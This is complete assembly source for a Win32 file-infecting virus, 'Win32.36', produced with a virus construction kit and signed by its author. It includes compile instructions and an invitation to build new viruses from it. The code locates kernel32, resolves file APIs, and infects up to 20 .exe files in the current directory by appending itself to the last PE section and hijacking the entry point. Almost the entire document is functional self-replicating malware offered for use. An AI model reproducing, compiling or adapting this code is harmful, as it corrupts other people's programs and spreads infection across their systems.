              
;
;
; Win32.36 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.36
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 2/29/2016
;  Infection Mark         : 36
;  Infection Type         : increasing last section
;  API Search             : Byte Comparison Type II
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 44
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m2 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 8d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
                                        ; add esp, 4
 add esp, 4d
 mov ecx, dword ptr [esp-4]
 sub ecx, offset Delta
                                        ; mov ebp, ecx
                                        ; clear ebp
 mov ebp, 40259d
 sub ebp, 40259d
 add ebp, ecx
 jmp KernelSearchStart


;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
 rol eax, 21d                           ; Trash
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop eax
 push eax
                                        ; store old EIP and ImageBase
 push dword ptr [ebp+OldEIP]
 pop ebx

 mov dword ptr [ebp+retEIP], ebx

 mov edx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], edx


                                        ; round to pages
 shr eax, 16d
 shl eax, 16d
                                        ; add eax, 1
 inc eax
GetKernelLoop:
                                        ; clear ecx
 and ecx, 0
 add eax, -1
 mov cx, word ptr [eax+03ch]
 test cx,0f800h
 jnz GetKernelLoop
 cmp eax, dword ptr [eax+ecx+34h]
 jnz GetKernelLoop
 mov dword ptr [ebp+KernelMZ], eax
 mov ebx, [eax+3Ch]
 add ebx, eax
 mov [KernelPE+ebp], ebx

 lea ebx, GetApis
 add ebx, ebp

 push ebx
ret


;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 mov edx, NumberOfApis

                                        ; load API Names and Offsets
 mov eax, ebp
 ror ecx, 21d                           ; Trash
 add eax, offset APINames

 mov edi, offset APIOffsets
 add edi, ebp


GetApisLoop: 
                                        ; clear the counter
 and word ptr [ebp+counter], 0h

                                        ; clear ecx
 mov ecx, -718d
 add ecx, 718d
 mov cl, byte ptr [eax]
                                        ; add eax, 1
 add eax, 1d

                                        ; search 'em
                                        ; ecx contains Name-Lenght
                                        ; eax points to the Name
                                        ; edi points to the offset

 call SearchAPI1
 add eax, ecx
 push dword ptr [ebp+TempAPI]
 pop ebx
 mov dword ptr [edi], 0
 add dword ptr [edi], ebx
                                        ; add edi, 4
 dec edi
 add edi, 5d
 dec edx
 jnz GetApisLoop
 jmp Outbreak



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 mov edx, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov eax, [edx+3Ch]
 add eax, edx
                                        ; get File Alignment
 mov ebx, [eax+3Ch]
 mov eax, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 mov dword ptr [ebp+AlignReg2], -1
 and dword ptr [ebp+AlignReg2], ebx
 add eax, VirusSize
 mov dword ptr [ebp+AlignReg1], 0
 xor dword ptr [ebp+AlignReg1], eax
 call Align
                                        ; mov eax, -1
 mov eax, 0
 add eax, -1d
 and eax, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], 0
 add dword ptr [ebp+NewSize], eax
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], 0
 add dword ptr [ebp+WFD_nFileSizeLow], eax
 call CreateMap
 jc NoEXE
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov ecx, dword ptr [esi+3Ch]
 add ecx, esi
                                        ; infect by increasing the last section
                                        ; clear esi
 mov esi, 37345d
 sub esi, 37345d
 add esi, ecx
                                        ; get last section
 movzx ebx, word ptr [esi+06h]
 dec ebx
 imul ebx, ebx, 28h
                                        ; add ecx, 120
 dec ecx
 add ecx, 121d
 add ecx, ebx
 mov edx, dword ptr [esi+74h]
 shl edx, 3
 add ecx, edx
                                        ; get old Entrypoint
 mov eax, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], eax
 mov edx, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], 0
 xor dword ptr [ebp+OldBase], edx
                                        ; clear eax
 xor eax, eax

 add eax, [ecx+10h]
                                        ; mov ebx, eax
 mov ebx, eax
 add ecx, 14h
 add eax, [ecx]
 sub ecx, 14h
 push eax
 mov edx, ebx
 add edx, [ecx+0Ch]
 mov dword ptr [ebp+NewEIP], edx
                                        ; save new enty point in file
 mov dword ptr [esi+28h], 0
 add dword ptr [esi+28h], edx
 mov edx, [ecx+10h]
 push edx
                                        ; calculate new section size
 push dword ptr  [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 add edx, VirusSize
 mov dword ptr [ebp+AlignReg1], 0
 add dword ptr [ebp+AlignReg1], edx
 call Align
 mov edx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ecx+10h], 0h
 add dword ptr [ecx+10h], edx
 pop edx
 add edx,  (VirusSize-1456d)
 add edx, 1456d
 mov dword ptr [ecx+08h], edx
 mov edx, dword ptr [ecx+10h]
 add edx, dword ptr [ecx+0Ch]
 mov dword ptr [esi+50h], edx
                                        ; set write, read and code flag
 or dword ptr [ecx+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], '36'
                                        ; Append Virus
 pop edi
 add edi, dword ptr [ebp+MapAddress]
 mov edx, VirusSize
 lea eax, [ebp+Virus]
 xchg esi, eax


AppendLoop:
 movsb
 dec edx
 jnz AppendLoop
                                        ; decrease Infection Counter
 mov edx, dword ptr [ebp+InfCounter]
 add edx, -1
 mov dword ptr [ebp+InfCounter], edx
 clc
ret

NoEXE:
 stc
ret



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
 lea ecx, [ebp+WFD_nFileSizeLow]
 xchg ecx, edx

 cmp dword ptr [edx], 20000d
 jbe NoInfection
                                        ; check for maximum filesize
 cmp dword ptr [ebp+WFD_nFileSizeHigh], 0
 jne NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov ebx, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [ebx], 'ZM'
 je Goodfile
                                        ; clear ecx
 mov ecx, 0
                                        ; add ecx, 1
 sub ecx, -1d
 dec ecx
 jz Notagoodfile

Goodfile:
 cmp word ptr [ebx+3Ch], 0h
 jne _Notagoodfile
 jmp Notagoodfile
_Notagoodfile:
 mov ecx, dword ptr [ebx+3Ch]
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],ecx
 jb Notagoodfile
 add ecx, ebx
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [ecx], 'EP'
 je Goodfile2
                                        ; clear eax
 push 0
 pop eax
 dec eax
 add eax, 1
 jz Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [ecx+4Ch], '36'
 jnz yNotagoodfile
 jmp Notagoodfile
yNotagoodfile:
                                        ; check for OBJ
 mov dx, word ptr [ecx+16h]
 and dx, 00002h
 cmp dx, 00002h
 jne Notagoodfile
 call InfectEXE                         ; Infect the file
 jc NoInfection

Notagoodfile:
 call UnMapFile
 xor eax, eax                           ; Trash

NoInfection:
ret




;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; ecx Lenght of API-Name
                                        ; eax Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad



                                        ; clear ebx
 and ebx, 0
 add ebx, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
 mov edi, [ebx+78h]
 add edi, [ebp+KernelMZ]
                                        ; add edi, 28
 dec edi
 add edi, 29d
                                        ; get ATableVA
 mov ebx, dword ptr [edi]
 add ebx, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], ebx
                                        ; add edi, 4
 dec edi
 add edi, 5d
                                        ; get NTableVA
 mov ebx, dword ptr [edi]
                                        ; add edi, 4
 inc edi
 add edi, 3d
 add ebx, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], ebx
                                        ; get OTableVA
 mov ebx, dword ptr [edi]
 add ebx, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], ebx
 mov edx, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push edx
 mov ebx, dword ptr [edx]
 add ebx, [ebp+KernelMZ]
                                        ; mov edx, ebx
 mov edx, ebx
                                        ; mov edi, ebx
                                        ; clear edi
 mov edi, 0
 add edi, ebx
 push ecx
 push edi
 mov dword ptr [ebp+TempApisearch3], 0
 add dword ptr [ebp+TempApisearch3], eax
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; eax Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov bh, byte ptr [eax]
 cmp bh, byte ptr [edi]
 jne ApiNotFound
 dec ecx
 test ecx, ecx
 jz FoundApi1
                                        ; add edi, 1
 add edi, 1d
                                        ; add eax, 1
 add eax, 1d
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 pop edi
 pop ecx
 pop edx
                                        ; clear eax
 and eax, 0
 xor eax, dword ptr [ebp+TempApisearch3]
                                        ; add edx, 4
 add edx, 4d
 sub word ptr [ebp+counter], -1
 cmp word ptr [ebp+counter], 2001h
 je NotFoundApi1
 jmp SearchNextApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 12d
                                        ; retrieve the offset
                                        ; clear ebx
 xor ebx, ebx
 mov bx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 sal ebx, 1                             ; multiply with 2
 add ebx, dword ptr [ebp+OTableVA]
 xchg ebx, edx
                                        ; clear ebx
 push 0
 pop ebx
 mov bx, word ptr [edx]
 shl ebx, 2h
 add ebx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov edx, dword ptr [ebx]
 add edx, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], edx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop edi
 popad
 jmp ExecuteHost



;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
                                        ; clear ecx
 mov ecx, 0
 xor ecx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], ecx

 push dword ptr [ebp+OldBase]
 pop ebx

 mov dword ptr [ebp+retBase], -1
 and dword ptr [ebp+retBase], ebx



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 test ebp, ebp
 jz FirstGenHost
 mov eax,12345678h
 org $-4
 retEIP dd 0h
 add eax,12345678h
 org $-4
 retBase dd 0h
 push eax
ret



;                  [ ///// * Data * \\\\\ ]

Data:
 ATableVA    dd 0h
 MapAddress  dd 0h
 KernelPE    dd 0h
 NewEIP      dd 0h
 OldEIP      dd 0h
 KernelMZ    dd 0h
 OldBase     dd 400000h

 APINames:
 db 14d, 'FindFirstFileA'
 db 11d, 'CreateFileA'
 db 13d, 'FindNextFileA'
 db 11d, 'CloseHandle'
 db 13d, 'MapViewOfFile'
 db 18d, 'CreateFileMappingA'
 db 09d, 'FindClose'
 db 15d, 'UnmapViewOfFile'

 MapHandle   dd 0h
 NTableVA    dd 0h
 Trash1      dd 0h
 InfCounter  dd 0h
 AlignReg2   dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 OTableVA    dd 0h
 FileHandle  dd 0h

 APIOffsets:
 XFindFirstFileA        dd 0h
 XCreateFileA           dd 0h
 XFindNextFileA         dd 0h
 XCloseHandle           dd 0h
 XMapViewOfFile         dd 0h
 XCreateFileMappingA    dd 0h
 XFindClose             dd 0h
 XUnmapViewOfFile       dd 0h

 db 'Win32.36 created by SnakeByte',0
 AlignReg1   dd 0h
 TempAPI     dd 0h
 counter     dw 0h
 filemask    db '*.Exe',0
 FindHandle  dd 0h
 TempApisearch3 dd 0h
 NewSize     dd 0h




;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 lea eax, [ebp+filemask]

                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir
                                        ; Set Infection Counter
 mov [ebp+InfCounter], 20d

InfectCurDirFile:                       ; Infect the file
 call InfectFile
 adc eax, ebx                           ; Trash
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 jna EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 cmp eax, 0
 jne InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear ecx
 xor ecx, ecx

 push ecx
 push ecx
 push 3h
 push ecx
                                        ; add ecx, 1
 inc ecx
 push ecx
 mov ecx, 80000000h or 40000000h
 push ecx
 mov ecx, offset WFD_szFileName
 add ecx, ebp

 push ecx
 call dword ptr [ebp+XCreateFileA]
 mov dword ptr [ebp+Trash1], ebx        ; Trash

 add eax, 1
 jz Closed
 sub eax, 1

 mov dword ptr [ebp+FileHandle], 0
 xor dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov ebx, dword ptr [ebp+WFD_nFileSizeLow]
 push ebx
 push 0
 push ebx
 push 0
                                        ; mov edx, 4
 mov edx, 4d
 push edx
 not ecx                                ; Trash
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop ebx
                                        ; add eax, 1
 inc eax
 sub eax, 1
 jz CloseFile
                                        ; clear eax
 push 0
 pop eax
 push ebx
 push eax
 push eax
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 or eax, eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], 0
 xor dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;          [ ///// * FindFiles Procedure * \\\\\ ]


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea edi, [ebp+WIN32_FIND_DATA]
 xchg ecx, edi

 push ecx
 push dword ptr [ebp+FindHandle]
 pop ecx
 push ecx
 call dword ptr [ebp+XFindNextFileA]
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
 lea edx, [ebp+WFD_szFileName]
 xchg edx, eax

                                        ; mov ebx, 276
 mov ebx, 276d

ClearOldData2:
 mov byte ptr [eax], 0h
                                        ; add eax, 1
 add eax, 1d
 dec ebx
 jnz ClearOldData2
 popad
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 mov ebx, offset WIN32_FIND_DATA
 add ebx, ebp

 push ebx
 push eax
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], -1
 and dword ptr [ebp+FindHandle], eax
ret





;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
 mov ebx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 mov edx, 15727d
 sub edx, 15727d
 push eax
 div ebx
 sub ebx, edx
 pop eax
 shr ecx, 24d                           ; Trash
 add eax, ebx
 mov dword ptr [ebp+AlignReg1], eax
 popad
ret


CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
                                        ; clear eax
 mov eax, 0
 push eax
 call ExitProcess



end FakeCode

